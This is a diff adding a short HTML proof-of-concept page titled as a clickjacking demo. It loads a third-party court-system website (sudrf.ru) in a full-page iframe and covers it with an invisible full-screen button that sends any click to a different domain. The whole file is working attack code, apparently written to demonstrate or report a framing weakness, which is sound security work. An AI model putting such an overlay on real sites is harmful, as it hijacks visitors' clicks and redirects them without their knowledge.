@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+<style>
+    body{
+        height: 100vh;
+        margin: 0;
+    }
+    iframe{
+        margin: 0;
+    }
+    input{
+        z-index: 1;
+        width: 100%;
+        height: 100%;
+        background-color: transparent;
+        position: absolute;
+        border: 0;
+    }
+</style>
+</head>
+<body>
+<input type=button class="input" onclick="location.href='https://blagotvorec.org';"/>
+<iframe src="http://sudrf.ru" width=100% height=100% style="opacity: 1;"></iframe>
+
+</body>
+</html>
